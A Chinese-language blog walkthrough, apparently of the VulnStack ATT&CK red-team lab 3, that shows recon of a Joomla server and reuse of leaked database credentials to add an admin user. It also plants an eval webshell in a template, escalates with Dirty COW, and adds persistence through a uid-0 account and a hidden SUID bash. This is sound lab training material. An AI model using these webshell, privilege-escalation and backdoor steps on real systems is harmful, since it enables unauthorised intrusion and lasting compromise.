@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"rerestst.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文内容梦里想到，纯属虚构！ 环境配置VMware Workstation新建VMnet2网卡，仅主机模式，192.168.93.0 web-centos机器需要重启桥接网卡：&#x2F;etc&#x2F;init.d&#x2F;network restart，IP地址为192.168.0.25 测试机Windows：192.168.0.27 测试机Linux：192.168.0.57">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK红队评估三VulnStack靶场攻略">
+<meta property="og:url" content="https://rerestst.github.io/2024/08/03/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89VulnStack%E9%9D%B6%E5%9C%BA%E6%94%BB%E7%95%A5/index.html">
+<meta property="og:site_name" content="rerestst&#39;s blog">
+<meta property="og:description" content="本文内容梦里想到，纯属虚构！ 环境配置VMware Workstation新建VMnet2网卡，仅主机模式，192.168.93.0 web-centos机器需要重启桥接网卡：&#x2F;etc&#x2F;init.d&#x2F;network restart，IP地址为192.168.0.25 测试机Windows：192.168.0.27 测试机Linux：192.168.0.57">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-03T06:31:36.000Z">
+<meta property="article:modified_time" content="2024-08-08T07:41:39.193Z">
+<meta property="article:author" content="rerestst">
+<meta property="article:tag" content="VulnStack">
+<meta property="article:tag" content="Domain">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://rerestst.github.io/2024/08/03/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89VulnStack%E9%9D%B6%E5%9C%BA%E6%94%BB%E7%95%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://rerestst.github.io/2024/08/03/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89VulnStack%E9%9D%B6%E5%9C%BA%E6%94%BB%E7%95%A5/","path":"2024/08/03/ATT&CK红队评估三VulnStack靶场攻略/","title":"ATT&CK红队评估三VulnStack靶场攻略"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ATT&CK红队评估三VulnStack靶场攻略 | rerestst's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">rerestst's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">18</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.1.</span> <span class="nav-text">目录枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-php"><span class="nav-number">2.1.1.</span> <span class="nav-text">1.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#configuration-php"><span class="nav-number">2.1.2.</span> <span class="nav-text">configuration.php~</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%86%99%E5%85%A5Webshell"><span class="nav-number">3.</span> <span class="nav-text">模板写入Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86192-168-93-120%E4%BF%A1%E6%81%AF"><span class="nav-number">4.</span> <span class="nav-text">收集192.168.93.120信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">4.1.</span> <span class="nav-text">收集敏感信息</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86192-168-0-25%E4%BF%A1%E6%81%AF"><span class="nav-number">5.</span> <span class="nav-text">收集192.168.0.25信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-CVE-2016-5195-dirtycow"><span class="nav-number">6.</span> <span class="nav-text">提权[CVE-2016-5195] dirtycow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">7.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%88%9B%E5%BB%BAuid%E4%B8%BA0%E7%9A%84%E7%94%A8%E6%88%B7"><span class="nav-number">7.1.</span> <span class="nav-text">1.创建uid为0的用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8suid%E6%9D%83%E9%99%90"><span class="nav-number">7.2.</span> <span class="nav-text">2.利用suid权限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E5%92%8CC2"><span class="nav-number">8.</span> <span class="nav-text">代理和C2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#frp"><span class="nav-number">8.1.</span> <span class="nav-text">frp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmeterpreter"><span class="nav-number">8.2.</span> <span class="nav-text">上线meterpreter</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-msfvenom"><span class="nav-number">8.2.1.</span> <span class="nav-text">1.msfvenom</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-web-delivery"><span class="nav-number">8.2.2.</span> <span class="nav-text">2.web_delivery</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86192-168-93-1-x2F-24%E4%BF%A1%E6%81%AF"><span class="nav-number">9.</span> <span class="nav-text">收集192.168.93.1&#x2F;24信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%95%E8%8E%B7NTLMv2%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="nav-number">10.</span> <span class="nav-text">捕获NTLMv2并利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E8%A3%85Responder"><span class="nav-number">10.1.</span> <span class="nav-text">安装Responder</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MSSQL-xp-dirtree%E8%AF%BB%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CNTLM%E7%AA%83%E5%8F%96"><span class="nav-number">10.2.</span> <span class="nav-text">MSSQL xp_dirtree读文件进行NTLM窃取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLMv2%E4%BC%A0%E9%80%92%EF%BC%88%E6%9C%AA%E6%88%90%E5%8A%9F%EF%BC%89"><span class="nav-number">10.3.</span> <span class="nav-text">NTLMv2传递（未成功）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3hash%EF%BC%88%E6%9C%AA%E6%88%90%E5%8A%9F%EF%BC%89"><span class="nav-number">10.4.</span> <span class="nav-text">破解hash（未成功）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BE%E5%BC%83%EF%BC%9A123qwe-ASD"><span class="nav-number">10.5.</span> <span class="nav-text">放弃：123qwe!ASD</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">11.</span> <span class="nav-text">横向移动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86192-168-93-20%E4%BF%A1%E6%81%AF"><span class="nav-number">12.</span> <span class="nav-text">收集192.168.93.20信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9A%E4%BD%8DDC"><span class="nav-number">12.1.</span> <span class="nav-text">定位DC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87smb%E5%85%B1%E4%BA%AB%E4%B8%8A%E4%BC%A0mimikatz%E8%8E%B7%E5%8F%96%E5%8F%A3%E4%BB%A4"><span class="nav-number">12.2.</span> <span class="nav-text">通过smb共享上传mimikatz获取口令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E6%8E%A7%E4%B8%8A%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-number">13.</span> <span class="nav-text">收集域控上敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">14.</span> <span class="nav-text">域权限维持：黄金票据</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rerestst"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">rerestst</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://rerestst.github.io/2024/08/03/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89VulnStack%E9%9D%B6%E5%9C%BA%E6%94%BB%E7%95%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rerestst">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ATT&CK红队评估三VulnStack靶场攻略 | rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ATT&CK红队评估三VulnStack靶场攻略
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-08-03 14:31:36" itemprop="dateCreated datePublished" datetime="2024-08-03T14:31:36+08:00">2024-08-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-08-08 15:41:39" itemprop="dateModified" datetime="2024-08-08T15:41:39+08:00">2024-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">靶机攻略</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>本文内容梦里想到，纯属虚构！</p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>VMware Workstation新建VMnet2网卡，仅主机模式，192.168.93.0</p>
+<p>web-centos机器需要重启桥接网卡：&#x2F;etc&#x2F;init.d&#x2F;network restart，IP地址为192.168.0.25</p>
+<p>测试机Windows：192.168.0.27</p>
+<p>测试机Linux：192.168.0.57</p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>192.168.0.25端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON          VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 128 OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    syn-ack ttl 128 nginx 1.9.4</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">|_http-server-header: nginx/1.9.4</span><br><span class="line">| http-robots.txt: 15 disallowed entries </span><br><span class="line">| /joomla/administrator/ /administrator/ /bin/ /cache/ </span><br><span class="line">| /cli/ /components/ /includes/ /installation/ /language/ </span><br><span class="line">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/</span><br><span class="line">3306/tcp open  mysql   syn-ack ttl 128 MySQL 5.7.27-0ubuntu0.16.04.1</span><br></pre></td></tr></table></figure>
+
+<p>登录页面：前台<a target="_blank" rel="noopener" href="http://192.168.0.25/index.php/login%EF%BC%8C%E5%90%8E%E5%8F%B0http://192.168.0.25/administrator/">http://192.168.0.25/index.php/login，后台http://192.168.0.25/administrator/</a></p>
+<p>查看Joomla!版本：<a target="_blank" rel="noopener" href="http://192.168.0.25/administrator/manifests/files/joomla.xml%EF%BC%8Cversion=3.9.12">http://192.168.0.25/administrator/manifests/files/joomla.xml，version=3.9.12</a></p>
+<h4 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h4><h5 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h5><p><a target="_blank" rel="noopener" href="http://192.168.0.25/1.php%EF%BC%9A%E5%86%85%E5%AE%B9%E4%B8%BAphpinfo()%E7%95%8C%E9%9D%A2">http://192.168.0.25/1.php：内容为phpinfo()界面</a></p>
+<p>disable_functions内容为exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</p>
+<p>网站根目录的绝对路径为&#x2F;var&#x2F;www&#x2F;html&#x2F;</p>
+<p>ubuntu16.04.1</p>
+<h5 id="configuration-php"><a href="#configuration-php" class="headerlink" title="configuration.php~"></a>configuration.php~</h5><p><a target="_blank" rel="noopener" href="http://192.168.0.25/configuration.php~%EF%BC%8C%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E5%86%85%E5%AE%B9%E9%87%8C%E7%9A%84%E5%88%86%E5%8F%B7%E6%9B%BF%E6%8D%A2%E4%B8%BA%E6%8D%A2%E8%A1%8C%EF%BC%9A">http://192.168.0.25/configuration.php~，配置文件，将内容里的分号替换为换行：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">请稍候访问。&#x27;</span><br><span class="line"> public $sitename = &#x27;test&#x27;</span><br><span class="line">...</span><br><span class="line"> public $dbtype = &#x27;mysqli&#x27;</span><br><span class="line"> public $host = &#x27;localhost&#x27;</span><br><span class="line"> public $user = &#x27;testuser&#x27;</span><br><span class="line"> public $password = &#x27;cvcvgjASD!@&#x27;</span><br><span class="line"> public $db = &#x27;joomla&#x27;</span><br><span class="line"> public $dbprefix = &#x27;am2zu_&#x27;</span><br><span class="line"> public $live_site = &#x27;&#x27;</span><br><span class="line"> public $secret = &#x27;gXN9Wbpk7ef3A4Ys&#x27;</span><br><span class="line"> public $gzip = &#x27;0&#x27;</span><br><span class="line">...</span><br><span class="line"> public $log_path = &#x27;/var/www/html/administrator/logs&#x27;</span><br><span class="line"> public $tmp_path = &#x27;/var/www/html/tmp&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>远程登录到MySQL 5.7.27</p>
+<p>经过尝试无权限getshell</p>
+<p>查看am2zu_users表中数据administrator:$2y$10$t1RelJijihpPhL8LARC9JuM&#x2F;AWrVR.nto&#x2F;XycrybdRbk8IEg6Dze2</p>
+<p>添加后台用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES (&#x27;Normal User&#x27;, &#x27;admin&#x27;,&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>通过admin:secret登录后台，页面显示An error has occurred.表示登录成功。</p>
+<h3 id="模板写入Webshell"><a href="#模板写入Webshell" class="headerlink" title="模板写入Webshell"></a>模板写入Webshell</h3><p>管理权限登录后台，Extensions–Templates–Templates</p>
+<p>点Protostar进入Templates: Customise (Protostar)</p>
+<p>编辑error.php，在Protostar模板的error.php写入eval($_REQUEST[c]);</p>
+<p>连接Webshell：<a target="_blank" rel="noopener" href="http://192.168.0.25/templates/protostar/error.php">http://192.168.0.25/templates/protostar/error.php</a></p>
+<p>通过哥斯拉BypassDisableFunction模块或蚁剑插件绕过disable_functions</p>
+<h3 id="收集192-168-93-120信息"><a href="#收集192-168-93-120信息" class="headerlink" title="收集192.168.93.120信息"></a>收集192.168.93.120信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*-rel*</span><br><span class="line">DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.6 LTS&quot;</span><br><span class="line"></span><br><span class="line">ip ad</span><br><span class="line">ens33:192.168.93.120</span><br><span class="line"></span><br><span class="line">arp -a</span><br><span class="line">(192.168.93.100) at 00:0c:29:32:46:d3 [ether] on ens33</span><br><span class="line"></span><br><span class="line">netstat -anplt</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 192.168.93.120:80       192.168.93.100:42079    ESTABLISHED -</span><br><span class="line"></span><br><span class="line">root:/root:/bin/bash</span><br><span class="line">yy:/home/yy:/bin/bash</span><br><span class="line"></span><br><span class="line">使用软件</span><br><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/curl</span><br><span class="line">/usr/bin/g++</span><br><span class="line">/usr/bin/gcc</span><br><span class="line">/usr/bin/lxc</span><br><span class="line">/usr/bin/make</span><br><span class="line">/bin/nc</span><br><span class="line">/bin/netcat</span><br><span class="line">/usr/bin/perl</span><br><span class="line">/usr/bin/php</span><br><span class="line">/bin/ping</span><br><span class="line">/usr/bin/python</span><br><span class="line">/usr/bin/python2</span><br><span class="line">/usr/bin/python2.7</span><br><span class="line">/usr/bin/python3</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/wget</span><br><span class="line"></span><br><span class="line">[CVE-2016-5195] dirtycow</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.txt 2&gt;/dev/null</span><br><span class="line">/tmp/mysql/test.txt</span><br><span class="line"></span><br><span class="line">tac /tmp/mysql/test.txt</span><br><span class="line">passwd wwwuser_123Aqx</span><br><span class="line">adduser wwwuser</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="收集192-168-0-25信息"><a href="#收集192-168-0-25信息" class="headerlink" title="收集192.168.0.25信息"></a>收集192.168.0.25信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh wwwuser@192.168.0.25 -p 22</span><br><span class="line"></span><br><span class="line">$ id</span><br><span class="line">uid=500(wwwuser) gid=500(wwwuser) groups=500(wwwuser)</span><br><span class="line"></span><br><span class="line">$ ip ad</span><br><span class="line">eth0:192.168.0.25</span><br><span class="line">eth1:192.168.93.100</span><br><span class="line"></span><br><span class="line">$ cat /etc/*-re*</span><br><span class="line">CentOS release 6.5 (Final)</span><br><span class="line"></span><br><span class="line">$ uname -a</span><br><span class="line">Linux 192.168.0.25 2.6.32-431.el6.x86_64</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="提权-CVE-2016-5195-dirtycow"><a href="#提权-CVE-2016-5195-dirtycow" class="headerlink" title="提权[CVE-2016-5195] dirtycow"></a>提权[CVE-2016-5195] dirtycow</h3><p>上传40839.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -pthread 40839.c -o dirty -lcrypt</span><br><span class="line">$ rm passwd.bak</span><br><span class="line">$ ./dirty pass123</span><br></pre></td></tr></table></figure>
+
+<p>重连SSH访问firefart用户发现提权成功</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="1-创建uid为0的用户"><a href="#1-创建uid为0的用户" class="headerlink" title="1.创建uid为0的用户"></a>1.创建uid为0的用户</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[firefart@localhost ~]# useradd -g root admin</span><br><span class="line">[firefart@localhost ~]# passwd admin</span><br><span class="line">123321qweewq</span><br><span class="line">[firefart@localhost ~]# echo &quot;admin:x:0:0::/root:/bin/bash&quot; &gt;&gt; /tmp/passwd.bak</span><br><span class="line">[firefart@localhost ~]# cp /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>登录时用户名输入为admin，登陆后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-利用suid权限"><a href="#2-利用suid权限" class="headerlink" title="2.利用suid权限"></a>2.利用suid权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /home/wwwuser/.pki/nssdb/.log</span><br><span class="line">chmod 4755 /home/wwwuser/.pki/nssdb/.log</span><br></pre></td></tr></table></figure>
+
+
+
+<p>低权限用户登陆后，运行该文件可获得root的shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[wwwuser@localhost ~]$ /home/wwwuser/.pki/nssdb/.log -p</span><br><span class="line">.log-4.1# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+
